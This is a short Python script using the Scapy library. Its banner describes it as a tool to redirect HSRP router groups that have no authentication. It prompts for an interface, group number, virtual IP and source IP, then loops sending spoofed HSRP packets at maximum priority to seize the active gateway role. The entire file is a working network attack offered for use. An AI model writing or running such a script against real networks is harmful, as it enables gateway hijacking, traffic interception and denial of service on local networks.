print 
print('Python script to redirect HSRP groups without security')
print

# Import Scapy functions
from scapy.all import *

# Gather information and set to variables
hsrpInterface = raw_input("What is your HSRP interface - note: get from ifconfig")
hsrpGroup = int(raw_input("What is the HSRP Group #?  "))
hsrpIP = raw_input("What is the HSRP Group Virtual IP?  ")
hsrpRepeat = int(raw_input("How often should the spoofed packets be sent (in seconds)?  "))
hsrpPriority = int("255")
hsrpSourceIP = raw_input("What should the source IP be?   ")

#
ip = IP(src=hsrpSourceIP, dst='224.0.0.2')
udp = UDP()
hsrp = HSRP(group=hsrpGroup, priority=hsrpPriority, virtualIP=hsrpIP)
send(ip/udp/hsrp, iface=hsrpInterface, inter=hsrpRepeat, loop=1)